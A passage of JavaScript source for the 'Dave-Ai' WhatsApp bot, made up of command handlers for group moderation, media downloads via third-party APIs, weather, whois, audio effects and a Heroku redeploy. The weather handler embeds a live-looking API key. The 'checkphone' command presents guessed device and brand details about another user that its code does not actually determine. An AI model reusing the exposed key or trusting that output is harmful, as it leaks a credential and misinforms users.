



case 'script':
case 'repo': {
  const botInfo = `
╭─ ⌬ Bot Info
│ • Name    : ${botname}
│ • Owner   : ${ownername}
│ • Version  : ${botversion}
│ • Repo : gitHub.com/gifteddevsmd/Dave-Ai/fork 
│ • Runtime  : ${runtime(process.uptime())}\n╰─────────────
`
  reply(botInfo)
}
break

case 'antibot': {
if (!m.isGroup) return m.reply(mess.group)
if (!isAdmins && !daveshown) return m.reply(mess.owner)
  try {
    await m.reply("Scanning group for suspected bot accounts...");

    const groupMeta = await dave.groupMetadata(from);
    
    const suspectedBots = groupMeta.participants.filter(p => {
      const hasBotInId = p.id.toLowerCase().includes('bot');
      const noProfilePic = !p.picture || p.picture === null;
      const defaultStatus = !p.status || p.status === null;
      return hasBotInId || (noProfilePic && defaultStatus);
    });

    if (suspectedBots.length === 0) {
      return m.reply("No suspected bots detected in this group.");
    }

    let botListText = suspectedBots.map((b, i) => `${i + 1}. @${b.id.split('@')[0]}`).join('\n');
    await dave.sendMessage(from, {
      text: `Suspected bot accounts detected:\n\n${botListText}\n\nThese accounts will be removed in 10 seconds.`,
      mentions: suspectedBots.map(b => b.id)
    });

    await new Promise(res => setTimeout(res, 10000));

    let removedCount = 0;
    for (const bot of suspectedBots) {
      try {
        await dave.groupParticipantsUpdate(from, [bot.id], 'remove');
        removedCount++;
      } catch (err) {
        console.error(`Failed to remove ${bot.id}:`, err.message);
      }
    }

    m.reply(`Removed ${removedCount} suspected bot(s) from the group!`);
  } catch (err) {
    console.error("antibot error:", err);
    m.reply("Failed to scan/remove bots. Make sure I'm an admin!");
  }
}
break
  
case 'antitag': {
if (!m.isGroup) return m.reply(mess.group)
if (!isAdmins && !daveshown) return m.reply(mess.owner)
  try {
    const option = args[0]?.toLowerCase();
    const mode = args[1]?.toLowerCase() || "delete";

    global.settings = global.settings || {};
    global.settings.antitag = global.settings.antitag || {};

    const groupId = from;

    if (option === "on") {
      global.settings.antitag[groupId] = { enabled: true, mode };
      saveSettings(global.settings);
      return m.reply(`AntiTag enabled! Mode: ${mode.toUpperCase()}\nMessages with tags will be ${mode === "kick" ? "deleted and user kicked" : "deleted"}.`);
    }

    if (option === "off") {
      if (global.settings.antitag[groupId]) {
        delete global.settings.antitag[groupId];
        saveSettings(global.settings);
      }
      return m.reply("AntiTag disabled for this group.");
    }

    const current = global.settings.antitag[groupId];
    m.reply(
      `AntiTag Settings for This Group\n\n` +
      `Status: ${current?.enabled ? "ON" : "OFF"}\n` +
      `Mode: ${current?.mode?.toUpperCase() || "DELETE"}\n\n` +
      `Usage:\n` +
      `.antitag on [delete/kick]\n` +
      `.antitag off`
    );

  } catch (err) {
    console.error("AntiTag Command Error:", err);
    m.reply("Error while updating antitag settings.");
  }
}
break

case 'antidemote': {
if (!m.isGroup) return m.reply(mess.group)
if (!isAdmins && !daveshown) return m.reply(mess.owner)
  const settings = loadSettings();
  const chatId = m.chat;
  settings.antidemote = settings.antidemote || {};

  const option = args[0]?.toLowerCase();
  const mode = args[1]?.toLowerCase() || "revert";

  if (option === "on") {
    settings.antidemote[chatId] = { enabled: true, mode };
    saveSettings(settings);
    return m.reply(`AntiDemote enabled! Mode: ${mode.toUpperCase()}`);
  }

  if (option === "off") {
    delete settings.antidemote[chatId];
    saveSettings(settings);
    return m.reply(`AntiDemote disabled!`);
  }

  const current =
    settings.antidemote[chatId]?.enabled
      ? `ON (${settings.antidemote[chatId].mode.toUpperCase()})`
      : "OFF";

  return m.reply(
    `AntiDemote Settings\n\n` +
    `Status: ${current}\n\n` +
    `Usage:\n` +
    `.antidemote on revert\n` +
    `.antidemote on kick\n` +
    `.antidemote off`
  );
}
break

case 'antipromote': {
if (!m.isGroup) return m.reply(mess.group)
if (!isAdmins && !daveshown) return m.reply(mess.owner)
  const settings = loadSettings();
  const chatId = m.chat;
  settings.antipromote = settings.antipromote || {};

  const option = args[0]?.toLowerCase();
  const mode = args[1]?.toLowerCase() || "revert";

  if (option === "on") {
    settings.antipromote[chatId] = { enabled: true, mode };
    saveSettings(settings);
    return m.reply(`AntiPromote enabled! Mode: ${mode.toUpperCase()}`);
  }

  if (option === "off") {
    delete settings.antipromote[chatId];
    saveSettings(settings);
    return m.reply(`AntiPromote disabled!`);
  }

  const current = settings.antipromote[chatId]?.enabled
    ? `ON (${settings.antipromote[chatId].mode})`
    : "OFF";

  return m.reply(
    `AntiPromote Settings\n\n` +
    `Status: ${current}\n\n` +
    `Usage:\n` +
    `.antipromote on revert\n` +
    `.antipromote on kick\n` +
    `.antipromote off`
  );
}
break

case 'antibadword': {
if (!m.isGroup) return m.reply(mess.group)
if (!isAdmins && !daveshown) return m.reply(mess.owner)
  try {
    const option = args[0]?.toLowerCase();
    const groupId = from;

    global.settings = global.settings || {};
    global.settings.antibadword = global.settings.antibadword || {};

    if (option === "on") {
      global.settings.antibadword[groupId] = {
        enabled: true,
        words: global.settings.antibadword[groupId]?.words || [],
        warnings: {}
      };
      saveSettings(global.settings);
      return m.reply("AntiBadword enabled for this group!");
    }

    if (option === "off") {
      delete global.settings.antibadword[groupId];
      saveSettings(global.settings);
      return m.reply("AntiBadword disabled for this group!");
    }

    if (option === "add") {
      const word = args.slice(1).join(" ").toLowerCase();
      if (!word) return m.reply("Usage: .antibadword add <word>");
      global.settings.antibadword[groupId] =
        global.settings.antibadword[groupId] || { enabled: true, words: [], warnings: {} };
      global.settings.antibadword[groupId].words.push(word);
      saveSettings(global.settings);
      return m.reply(`Added bad word: This word is not allowed by group members from now`);
    }

    if (option === "remove") {
      const word = args.slice(1).join(" ").toLowerCase();
      if (!word) return m.reply("Usage: .antibadword remove <word>");
      if (!global.settings.antibadword[groupId]?.words?.includes(word))
        return m.reply("Word not found in list!");
      global.settings.antibadword[groupId].words =
        global.settings.antibadword[groupId].words.filter(w => w !== word);
      saveSettings(global.settings);
      return m.reply(`Removed bad word: ${word}`);
    }

    if (option === "list") {
      const list = global.settings.antibadword[groupId]?.words || [];
      if (list.length === 0) return m.reply("No bad words added yet!");
      return m.reply(`Bad Words List:\n${list.map((w, i) => `${i + 1}. ${w}`).join("\n")}`);
    }

    return m.reply(
      `AntiBadword Settings\n\n` +
      `Status: ${global.settings.antibadword[groupId]?.enabled ? "ON" : "OFF"}\n` +
      `Words: ${(global.settings.antibadword[groupId]?.words?.length || 0)}\n\n` +
      `Usage:\n` +
      `.antibadword on\n` +
      `.antibadword off\n` +
      `.antibadword add <word>\n` +
      `.antibadword remove <word>\n` +
      `.antibadword list`
    );

  } catch (err) {
    console.error("AntiBadword Command Error:", err);
    m.reply("Error while updating antibadword settings.");
  }
}
break

case 'sc':
case 'git':
case 'deployme':
case 'rep':
case 'DaveAi': {
    const axios = require('axios');
    const owner = "gifteddevsmd";
    const repo = "Dave-Ai";
    const apiUrl = `https://api.github.com/repos/${owner}/${repo}`;
    const collabUrl = `https://api.github.com/repos/${owner}/${repo}/collaborators`;

    await reply("Fetching repository details...");

    try {
        const repoRes = await axios.get(apiUrl, { headers: { "User-Agent": "DaveAi" } });
        const data = repoRes.data;

        let collabCount = 0;
        try {
            const collabRes = await axios.get(collabUrl, { headers: { "User-Agent": "DaveAi" } });
            collabCount = collabRes.data.length;
        } catch {
            collabCount = "Private/Hidden";
        }

        const msg = `
𝘿𝙖𝙫𝙚𝘼𝙄 REPO

Repository: ${data.html_url}

Stars: ${data.stargazers_count}
Forks: ${data.forks_count}

Collaborators: ${collabCount}

Last Updated: ${new Date(data.updated_at).toLocaleString()}

Owner: ${data.owner.login}

Language: ${data.language || "Kijaluo"}

Description: "_𝘿𝙖𝙫𝙚𝘼𝙄 by Dave_"
`;

        await reply(msg);
    } catch (err) {
        console.error(err);
        await reply("Failed to fetch repository info. Please try again later.");
    }
}
break

case "updateheroku": 
case "redeploy": {
    const axios = require('axios');
    if(!daveshown) return reply(mess.owner);
    if (!appname || !herokuapi) {
        await reply("It looks like the Heroku app name or API key is not set. Please make sure you have set the `APP_NAME` and `HEROKU_API` environment variables.");
        return;
    }

    async function redeployApp() {
        try {
            const response = await axios.post(
                `https://api.heroku.com/apps/${appname}/builds`,
                {
                    source_blob: {
                        url: "https://github.com/gifteddevsmd/Dave-Ai/tarball/main",
                    },
                },
                {
                    headers: {
                        Authorization: `Bearer ${herokuapi}`,
                        Accept: "application/vnd.heroku+json; version=3",
                    },
                }
            );

            await m.reply("Your bot is undergoing an upgrade, hold  for the next 2 minutes as the redeploy executes! Once done, you'll have the freshest version of *Dave-Ai* .");
            console.log("Build details:", response.data);
        } catch (error) {
            const errorMessage = error.response?.data || error.message;
            await reply(`Failed to update and redeploy. Please check if you have set the Heroku API key and Heroku app name correctly.`);
            console.error("Error triggering redeploy:", errorMessage);
        }
    }

    redeployApp();
}
break

case 'video': {
  try {
    if (!text) return reply('What video do you want to download?');

    let videoUrl = '';
    let videoTitle = '';
    let videoThumbnail = '';

    if (text.startsWith('http://') || text.startsWith('https://')) {
      videoUrl = text;
    } else {
      const { videos } = await yts(text);
      if (!videos || videos.length === 0) return reply('No videos found!');
      videoUrl = videos[0].url;
      videoTitle = videos[0].title;
      videoThumbnail = videos[0].thumbnail;
    }

    const izumi = {
      baseURL: "https://izumiiiiiiii.dpdns.org"
    };

    const AXIOS_DEFAULTS = {
      timeout: 60000,
      headers: {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Accept': 'application/json, text/plain, */*'
      }
    };

    const tryRequest = async (getter, attempts = 3) => {
      let lastError;
      for (let attempt = 1; attempt <= attempts; attempt++) {
        try {
          return await getter();
        } catch (err) {
          lastError = err;
          if (attempt < attempts) {
            await new Promise(r => setTimeout(r, 1000 * attempt));
          }
        }
      }
      throw lastError;
    };

    const getIzumiVideoByUrl = async (youtubeUrl) => {
      const apiUrl = `${izumi.baseURL}/downloader/youtube?url=${encodeURIComponent(youtubeUrl)}&format=720`;
      const res = await tryRequest(() => axios.get(apiUrl, AXIOS_DEFAULTS));
      if (res?.data?.result?.download) return res.data.result;
      throw new Error('Izumi video API returned no download');
    };

    const getOkatsuVideoByUrl = async (youtubeUrl) => {
      const apiUrl = `https://okatsu-rolezapiiz.vercel.app/downloader/ytmp4?url=${encodeURIComponent(youtubeUrl)}`;
      const res = await tryRequest(() => axios.get(apiUrl, AXIOS_DEFAULTS));
      if (res?.data?.result?.mp4) {
        return {
          download: res.data.result.mp4,
          title: res.data.result.title
        };
      }
      throw new Error('Okatsu API returned no mp4');
    };

    try {
      const ytId = (videoUrl.match(/(?:youtu\.be\/|v=)([a-zA-Z0-9_-]{11})/) || [])[1];
      const thumb = videoThumbnail || (ytId ? `https://i.ytimg.com/vi/${ytId}/sddefault.jpg` : undefined);
      const captionTitle = videoTitle || text;

      if (thumb) {
        await dave.sendMessage(m.chat, {
          image: { url: thumb },
          caption: `*${captionTitle}*\n> _🏂searching video data..._`,
        }, { quoted: m });
      }
    } catch (e) {
      console.error('[VIDEO] Thumbnail Error:', e?.message || e);
    }

    const urls = videoUrl.match(/(?:https?:\/\/)?(?:youtu\.be\/|(?:www\.|m\.)?youtube\.com\/(?:watch\?v=|v\/|embed\/|shorts\/|playlist\?list=)?)([a-zA-Z0-9_-]{11})/gi);
    if (!urls) return reply('This is not a valid YouTube link!');

    let videoData;
    try {
      videoData = await getIzumiVideoByUrl(videoUrl);
    } catch (e1) {
      console.warn('[VIDEO] Izumi failed, trying Okatsu:', e1?.message || e1);
      videoData = await getOkatsuVideoByUrl(videoUrl);
    }

    await dave.sendMessage(m.chat, {
      video: { url: videoData.download },
      mimetype: 'video/mp4',
      fileName: `${videoData.title || videoTitle || 'video'}.mp4`,
      caption: `*${videoData.title || videoTitle || 'Video'}*`,
    }, { quoted: m });

  } catch (error) {
    console.error('[VIDEO] Command Error:', error?.message || error);
    reply('Download failed: ' + (error?.message || 'Unknown error'));
  }
}
break

case 'weather': {
    try {
        if (!text) return reply("provide a city/town name");
        const response = await fetch(`http://api.openweathermap.org/data/2.5/weather?q=${text}&units=metric&appid=1ad47ec6172f19dfaf89eb3307f74785`);
        const data = await response.json();

        console.log("Weather data:",data);

        const cityName = data.name;
        const temperature = data.main.temp;
        const feelsLike = data.main.feels_like;
        const minTemperature = data.main.temp_min;
        const maxTemperature = data.main.temp_max;
        const description = data.weather[0].description;
        const humidity = data.main.humidity;
        const windSpeed = data.wind.speed;
        const rainVolume = data.rain ? data.rain['1h'] : 0;
        const cloudiness = data.clouds.all;
        const sunrise = new Date(data.sys.sunrise * 1000);
        const sunset = new Date(data.sys.sunset * 1000);

        await m.reply(`❄️ Weather in ${cityName}

🌡️ Temperature: ${temperature}°C
📝 Description: ${description}
❄️ Humidity: ${humidity}%
🌀 Wind Speed: ${windSpeed} m/s
🌧️ Rain Volume (last hour): ${rainVolume} mm
☁️ Cloudiness: ${cloudiness}%
🌄 Sunrise: ${sunrise.toLocaleTimeString()}
🌅 Sunset: ${sunset.toLocaleTimeString()}`);

    } catch (e) { 
        reply("Unable to find that location.") 
    }
}
break

case 'gitclone': {
    if (!text) return m.reply(`Where is the link?`)
    if (!text.includes('github.com')) return reply(`Is that a GitHub repo link ?!`)
    let regex1 = /(?:https|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/(.+)/i
    let [, user3, repo] = text.match(regex1) || []
    repo = repo.replace(/.git$/, '')
    let url = `https://api.github.com/repos/${user3}/${repo}/zipball`
    let filename = (await fetch(url, {method: 'HEAD'})).headers.get('content-disposition').match(/attachment; filename=(.*)/)[1]
    await dave.sendMessage(m.chat, { document: { url: url }, fileName: filename+'.zip', mimetype: 'application/zip' }, { quoted: m }).catch((err) => reply("error"))
}
break

case 'whois': {
  try {
    if (!m.quoted && args.length === 0) 
      return reply("Provide a user number (e.g., 2547xxxxxxx) to get info.");

    const jid = m.quoted ? m.quoted.sender : `${args[0].replace(/[^0-9]/g, '')}@s.whatsapp.net`;

    let ppUrl;
    try {
      ppUrl = await dave.profilePictureUrl(jid);
    } catch {
      ppUrl = 'https://i.ibb.co/0jqHpnp/No-Profile-Pic.png';
    }

    let about = 'Not set';
    try {
      const status = await dave.status(jid);
      about = status.status || about;
    } catch {}

    const number = jid.split('@')[0];

    await dave.sendMessage(from, {
      image: { url: ppUrl },
      caption: `Whois Info:\n\nNumber: +${number}\nAbout: ${about}`
    }, { quoted: m });

  } catch (err) {
    console.error('whois command error:', err);
    await reply('Failed to fetch user info.');
  }
}
break

case 'checkphone': {
    try {
        let target;
        if (m.message.extendedTextMessage?.contextInfo?.mentionedJid?.length) {
            target = m.message.extendedTextMessage.contextInfo.mentionedJid[0];
        } else if (m.quoted && m.quoted.sender) {
            target = m.quoted.sender;
        } else {
            target = m.sender;
        }

        const [userData] = await dave.onWhatsApp(target);
        if (!userData) return reply("User not found on WhatsApp.");

        let deviceType = "Unknown";
        if (m.key.id.startsWith("3EB0")) deviceType = "Android";
        else if (m.key.id.startsWith("3AEB")) deviceType = "iPhone";
        else if (m.key.id.startsWith("BAE5")) deviceType = "Web";
        else if (m.key.id.startsWith("7EBA")) deviceType = "KaiOS";

        const ua = (dave.user?.platform || "WhatsApp MD").toLowerCase();
        let phoneBrand = "Unknown";

        if (/samsung|sm-|galaxy/.test(ua)) phoneBrand = "Samsung";
        else if (/tecno/.test(ua)) phoneBrand = "Tecno";
        else if (/infinix/.test(ua)) phoneBrand = "Infinix";
        else if (/itel/.test(ua)) phoneBrand = "Itel";
        else if (/nokia/.test(ua)) phoneBrand = "Nokia";
        else if (/iphone|ios/.test(ua)) phoneBrand = "Apple iPhone";
        else if (/xiaomi|redmi/.test(ua)) phoneBrand = "Xiaomi";
        else if (/huawei/.test(ua)) phoneBrand = "Huawei";
        else if (/oppo/.test(ua)) phoneBrand = "Oppo";
        else if (/vivo/.test(ua)) phoneBrand = "Vivo";
        else if (/desktop|mac/.test(ua)) phoneBrand = "Desktop/PC";

        const result = `
Device Check

User: @${target.split('@')[0]}
Device Type: ${deviceType}
Brand / Model: ${phoneBrand}
Platform: ${dave.user?.platform || "WhatsApp Multi-Device"}
WhatsApp Version: ${dave.user?.waVersion?.join('.') || "Unknown"}
        `.trim();

        await dave.sendMessage(from, { text: result, mentions: [target] }, { quoted: m });
    } catch (err) {
        console.error("checkphone error:", err);
        reply("Failed to fetch device information.");
    }
}
break

case 'uptime':
case 'runtime': {
  const uptime = process.uptime();
  const days = Math.floor(uptime / (24 * 3600));
  const hours = Math.floor((uptime % (24 * 3600)) / 3600);
  const minutes = Math.floor((uptime % 3600) / 60);
  const seconds = Math.floor(uptime % 60);
  dave.sendMessage(m.chat, { text: `𝘿𝙖𝙫𝙚𝘼𝙄 Runtime: ${days}d ${hours}h ${minutes}m ${seconds}s` });
}
break

case 'setdp': {
  try {
    const { downloadContentFromMessage } = require('@whiskeysockets/baileys');
    const fs = require('fs');
    const path = require('path');
    const tmp = require('os').tmpdir();

    const quotedMsg = m.message?.extendedTextMessage?.contextInfo?.quotedMessage;
    if (!quotedMsg || !quotedMsg.imageMessage) {
      return reply("Reply to an image to set it as bot profile picture!");
    }

    reply("Updating profile picture...");

    const stream = await downloadContentFromMessage(quotedMsg.imageMessage, 'image');
    let buffer = Buffer.from([]);
    for await (const chunk of stream) buffer = Buffer.concat([buffer, chunk]);

    const tempFile = path.join(tmp, `dp_${Date.now()}.jpg`);
    fs.writeFileSync(tempFile, buffer);

    await dave.updateProfilePicture(dave.user.id, { url: tempFile });

    fs.unlinkSync(tempFile);

    reply("Bot profile picture updated!");
  } catch (err) {
    console.error("setdp error:", err);
    reply("Failed to update bot profile picture.");
  }
}
break

case 'ping': {
  const start = Date.now();
  const sentMsg = await m.reply('Pinging...');
  const latency = Date.now() - start;

  await dave.sendMessage(
    m.chat,
    { text: `Pong! Latency: ${latency}ms` },
    { edit: sentMsg.key }
  );
}
break

case 'claude-al': {
  try {
    const question = args.join(' ');
    if (!question) return reply('Please provide a question. Usage: .claude-al <your question>');

    await reply('Asking Claude, please wait...');

    const fetch = require('node-fetch');
    const apiUrl = `https://savant-api.vercel.app/ai/claude?question=${encodeURIComponent(question)}`;

    const res = await fetch(apiUrl);
    if (!res.ok) throw new Error(`HTTP error ${res.status}`);

    let data;
    try {
      data = await res.json();
    } catch {
      const text = await res.text();
      data = { answer: text };
    }

    console.log('Claude API response:', data);

    const answer =
      data.answer ||
      data.response ||
      data.result ||
      data.output ||
      data.text ||
      "No valid response received from API.";

    await reply(`Claude AI Response:\n\n${answer}`);
  } catch (err) {
    console.error('Claude Command Error:', err);
    await reply(`Failed to fetch response from Claude API.\nError: ${err.message}`);
  }
}
break

case 'yts': 
case 'ytsearch': {
    if (!text) return reply(`Example : ${prefix + command} faded`)
    let yts = require("yt-search")
    let search = await yts(text)
    let teks = 'YouTube Search\n\n Result From '+text+'\n\n'
    let no = 1
    for (let i of search.all) {
        teks += `❤️ No : ${no++}\n❤️Type : ${i.type}\n ❤️Video ID : ${i.videoId}\n❤️ Title : ${i.title}\n❤️ Views : ${i.views}\n❤️ Duration : ${i.timestamp}\n❤️ Uploaded : ${i.ago}\n❤️ Url : ${i.url}\n\n─────────────────\n\n`
    }
    dave.sendMessage(m.chat, { image: { url: search.all[0].thumbnail },  caption: teks }, { quoted: m })
}
break

case 'shorturl': {
    const zlib = require('zlib');
    const qs = require('querystring');      
    const kualatshort = async (url) => {
      const res = await axios.post(
        'https://kua.lat/shorten',
        qs.stringify({ url }),
        {
          responseType: 'arraybuffer',
          headers: {
            'Accept': 'application/json, text/javascript, */*; q=0.01',
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept-Language': 'id-ID,id;q=0.9,en-AU;q=0.8,en;q=0.7,en-US;q=0.6',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'Origin': 'https://kua.lat',
            'Referer': 'https://kua.lat/',
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
            'X-Requested-With': 'XMLHttpRequest'
          }
        }
      )

      let decoded
      const encoding = res.headers['content-encoding']

      if (encoding === 'br') {
        decoded = zlib.brotliDecompressSync(res.data)
      } else if (encoding === 'gzip') {
        decoded = zlib.gunzipSync(res.data)
      } else if (encoding === 'deflate') {
        decoded = zlib.inflateSync(res.data)
      } else {
        decoded = res.data
      }

      return JSON.parse(decoded.toString())
    }

    try {
      if (!text) return m.reply('Use : .shorturl https://example.com')

      const result = await kualatshort(text)

      if (!result?.data?.shorturl) {
        return m.reply('failed to create url.')
      }

      reply(`🔗 *Short URL:*\n${result.data.shorturl}`)
    } catch (e) {
      console.error('[SHORTURL] Error:', e)
      reply(`Error: ${e.message}`)
    }
}
break

case 'anticallwhitelist':
case 'allowedcallers': {
    if (!daveshown) return reply(mess.owner);

    const ANTICALL_PATH = './library/database/anticall.json';

    try {
        let data = { enabled: false, whitelist: [] };
        if (fs.existsSync(ANTICALL_PATH)) {
            const fileContent = fs.readFileSync(ANTICALL_PATH, 'utf8');
            data = JSON.parse(fileContent || '{}');
        }
        if (!data.whitelist) data.whitelist = [];

        let targetUser;
        if (m.mentionedJid && m.mentionedJid.length > 0) {
            targetUser = m.mentionedJid[0];
        } else if (m.quoted) {
            targetUser = m.quoted.sender;
        } else {
            return reply('Please mention a user or reply to their message\nExample: .anticallwhitelist @user');
        }

        const username = targetUser.split('@')[0];

        if (data.whitelist.includes(targetUser)) {
            data.whitelist = data.whitelist.filter(u => u !== targetUser);
            fs.writeFileSync(ANTICALL_PATH, JSON.stringify(data, null, 2));
            reply(`❌ Removed @${username} from call whitelist\nThey will now be blocked if they call.`);
        } else {
            data.whitelist.push(targetUser);
            fs.writeFileSync(ANTICALL_PATH, JSON.stringify(data, null, 2));
            reply(`✅ Added @${username} to call whitelist\nThey can now call without being blocked.`);
        }

    } catch (err) {
        console.error('Whitelist error:', err);
        reply('❌ Error managing call whitelist');
    }
}
break

case 'callwhitelist':
case 'showallowed': {
    if (!daveshown) return reply(mess.owner);

    const ANTICALL_PATH = './library/database/anticall.json';

    try {
        let data = { enabled: false, whitelist: [] };
        if (fs.existsSync(ANTICALL_PATH)) {
            const fileContent = fs.readFileSync(ANTICALL_PATH, 'utf8');
            data = JSON.parse(fileContent || '{}');
        }
        if (!data.whitelist) data.whitelist = [];

        if (data.whitelist.length === 0) {
            reply('📝 Call whitelist is empty\nNo users are allowed to call.');
        } else {
            const userList = data.whitelist.map(u => `• @${u.split('@')[0]}`).join('\n');
            reply(`📝 Call Whitelist (${data.whitelist.length} users):\n\n${userList}`);
        }

    } catch (err) {
        console.error('Whitelist view error:', err);
        reply('❌ Error reading call whitelist');
    }
}
break

case 'goodbye': {
  if (!m.isGroup) return reply(mess.owner)
  if (!isAdmins) return reply(mess.admin)
  if (args[0] === "on") {
    if (db.data.chats[m.chat].goodbye) return reply('Already activated previously')
    db.data.chats[m.chat].goodbye = true
    reply('Successfully activated goodbye!')
  } else if (args[0] === "off") {
    if (!db.data.chats[m.chat].goodbye) return reply('Already deactivated previously')
    db.data.chats[m.chat].goodbye = false
    reply('Successfully deactivated goodbye!')
  } else {
    reply('Command not recognized. Use "on" to activate or "off" to deactivate.')
  }
}
break

case 'bass':
case 'blown':
case 'deep':
case 'earrape':
case 'fast':
case 'fat':
case 'nightcore':
case 'reverse':
case 'robot':
case 'slow':
case 'smooth':
case 'tupai': {
    try {
        if (!m.quoted || !m.quoted.message) return reply(`Reply to an audio you want to convert with the caption ${prefix + command}`);
        
        const quotedMsg = m.quoted.message;
        const isAudio = quotedMsg.audioMessage || 
                       quotedMsg.pttMessage || 
                       (quotedMsg.extendedTextMessage && quotedMsg.extendedTextMessage.contextInfo && 
                        (quotedMsg.extendedTextMessage.contextInfo.quotedMessage.audioMessage || 
                         quotedMsg.extendedTextMessage.contextInfo.quotedMessage.pttMessage));
        
        if (!isAudio) return reply('Reply to an audio file!');

        dave.sendMessage(m.chat, { react: { text: "⏱️", key: m.key } }).catch(() => {});

        let set;
        if (/bass/.test(command)) set = '-af equalizer=f=54:width_type=o:width=2:g=20';
        if (/blown/.test(command)) set = '-af acrusher=.1:1:64:0:log';
        if (/deep/.test(command)) set = '-af atempo=4/4,asetrate=44500*2/3';
        if (/earrape/.test(command)) set = '-af volume=12';
        if (/fast/.test(command)) set = '-filter:a "atempo=1.63,asetrate=44100"';
        if (/fat/.test(command)) set = '-filter:a "atempo=1.6,asetrate=22100"';
        if (/nightcore/.test(command)) set = '-filter:a atempo=1.06,asetrate=44100*1.25';
        if (/reverse/.test(command)) set = '-filter_complex "areverse"';
        if (/robot/.test(command)) set = '-filter_complex "afftfilt=real=\'hypot(re,im)*sin(0)\':imag=\'hypot(re,im)*cos(0)\':win_size=512:overlap=0.75"';
        if (/slow/.test(command)) set = '-filter:a "atempo=0.7,asetrate=44100"';
        if (/smooth/.test(command)) set = '-filter:v "minterpolate=\'mi_mode=mci:mc_mode=aobmc:vsbmc=1:fps=120\'"';
        if (/tupai/.test(command)) set = '-filter:a "atempo=0.5,asetrate=65100"';

        (async () => {
            const mediaPath = await dave.downloadAndSaveMediaMessage(m.quoted);
            const outputPath = getRandom('.mp3');

            exec(`ffmpeg -i "${mediaPath}" ${set} "${outputPath}"`, (err) => {
                fs.unlinkSync(mediaPath);

                if (err) return reply('Error processing audio: ' + err.message);

                const buffer = fs.readFileSync(outputPath);
                dave.sendMessage(m.chat, { audio: buffer, mimetype: 'audio/mpeg' }, { quoted: m })
                    .catch(() => {})
                    .finally(() => fs.unlinkSync(outputPath));
            });
        })();

    } catch (error) {
        console.error('Audio effect error:', error);
        reply('Something went wrong while processing the audio.');
    }
}
break

case 'checktime':
case 'time': {
    try {
        if (!text) return reply("Please provide a city or country name to check the local time.");
        await reply(`Checking local time for ${text}...`);
        const tzRes = await fetch(`https://worldtimeapi.org/api/timezone`);
        const timezones = await tzRes.json();
        const match = timezones.find(tz => tz.toLowerCase().includes(text.toLowerCase()));
        if (!match) return reply(`Could not find timezone for ${text}.`);
        const res = await fetch(`https://worldtimeapi.org/api/timezone/${match}`);
        const data = await res.json();
        const datetime = new Date(data.datetime);
        const hours = datetime.getHours();
        const greeting = hours < 12 ? "Good Morning" : hours < 18 ? "Good Afternoon" : "Good Evening";
        const timeText = `
Local Time in ${text}
${greeting}
Timezone: ${data.timezone}
Time: ${datetime.toLocaleTimeString()}
Date: ${datetime.toDateString()}
Uptime: ${formatUptime(process.uptime())}`;
        await reply(timeText);
    } catch (e) {
        console.error("checktime error:", e);
        reply("Unable to fetch time for that city.");
    }
}
break

case 'sound1':
case 'sound2':
case 'sound3':
case 'sound4':
case 'sound5':
case 'sound6':
case 'sound7':
case 'sound8':
case 'sound9':
case 'sound10': {
    try {
        const link = `https://raw.githubusercontent.com/Leoo7z/Music/main/${command}.mp3`;
        await dave.sendMessage(m.chat, {
            audio: { url: link },
            mimetype: 'audio/mpeg'
        }, { quoted: m });
    } catch (err) {
        reply(`❌ An error occurred: ${err.message || err}`);
    }
}
break

case 'getpastebin': 
case 'getpb': {
    if (!text) return reply(`🔗 Example:\n.getpb https://pastebin.com/raw/abc123`);
    try {
        const res = await fetch(`https://api.nekorinn.my.id/tools/getpastebin?url=${encodeURIComponent(text)}`);
        const json = await res.json();
        if (!json.status) return reply('⚠️ Failed to fetch data from Pastebin.');

        const content = json.result.content
            .split('\n')
            .filter(line => !line.trim().startsWith('//'))
            .join('\n');

        const preview = content.length > 4000 ? content.slice(0, 4000) + '\n\n📌 (Auto-truncated)' : content;

        await reply(`📄 Pastebin Content:\n\n${preview}`);
    } catch (err) {
        reply(`❌ Error fetching Pastebin content: ${err.message}`);
    }
}
break

case 'ssweb': {
  try {
    const url = args[0];
    if (!url) return reply('Please provide a valid URL.\nExample: .ssweb https://example.com');

    await reply('Capturing screenshot, please wait...');

    const fetch = require('node-fetch');
    const apiUrl = `https://api.zenzxz.my.id/api/tools/ssweb?url=${encodeURIComponent(url)}`;

    const res = await fetch(apiUrl);
    if (!res.ok) throw new Error(`HTTP error ${res.status}`);
    const buffer = await res.buffer();

    await dave.sendMessage(from, {
      image: buffer,
      caption: `Screenshot of: ${url}`,
    }, { quoted: m });

  } catch (err) {
    console.error('ssweb Command Error:', err);
    await reply(`Failed to capture screenshot.\nError: ${err.message}`);
  }
}
break

case 'snackvideo': 
case 'sv': {
    if (!text) return reply(`❌ Example: ${prefix + command} https://snackvideo.com/somevideo`);
    try {
        const res = await fetch(`https://api.siputzx.my.id/api/d/snackvideo?url=${text}`);
        const data = await res.json();
        if (!data?.data?.length) return reply(`⚠️ No media found.`);

        for (const item of data.data) {
            const head = await axios.head(item.url);
            const mime = head.headers['content-type'];

            if (/image/.test(mime)) {
                await dave.sendMessage(m.chat, { image: { url: item.url }, caption: '✅ Image downloaded successfully.' }, { quoted: m });
            } else if (/video/.test(mime)) {
                await dave.sendMessage(m.chat, { video: { url: item.url }, caption: '🎥 Video downloaded successfully.' }, { quoted: m });
            } else {
                await reply(`⚠️ Unsupported media type: ${mime}`);
            }
        }
    } catch (err) {
        reply(`❌ Error: ${err.message}`);
    }
}
break

case 'capcut': 
case 'cc': {
    if (!text) return reply(`❌ Example: ${prefix + command} <CapCut Link>`);
    try {
        const res = await fetch(`https://api.siputzx.my.id/api/d/capcut?url=${text}`);
        const data = await res.json();
        if (!data?.data?.length) return reply(`⚠️ No media found.`);

        for (const item of data.data) {
            const head = await axios.head(item.url);
            const mime = head.headers['content-type'];

            if (/image/.test(mime)) {
                await dave.sendMessage(m.chat, { image: { url: item.url }, caption: '✅ Image downloaded successfully.' }, { quoted: m });
            } else if (/video/.test(mime)) {
